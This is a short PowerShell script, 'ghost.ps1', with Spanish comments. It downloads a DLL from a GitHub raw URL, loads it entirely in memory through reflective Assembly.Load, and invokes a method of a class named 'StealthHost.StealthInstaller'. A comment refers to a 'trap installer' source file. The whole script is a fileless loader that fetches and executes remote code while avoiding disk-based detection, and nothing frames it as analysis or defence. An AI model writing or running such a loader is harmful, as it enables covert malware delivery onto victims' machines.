# ghost.ps1 - Carga en RAM absoluta
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/sys.dll" # <--- Tu DLL compilada
$bytes = (New-Object System.Net.WebClient).DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$class = $assembly.GetType("StealthHost.StealthInstaller")
$method = $class.GetMethod("Uninstall") # <--- Tu método en InstaladorTrampa.cs
$method.Invoke($null, @($null))
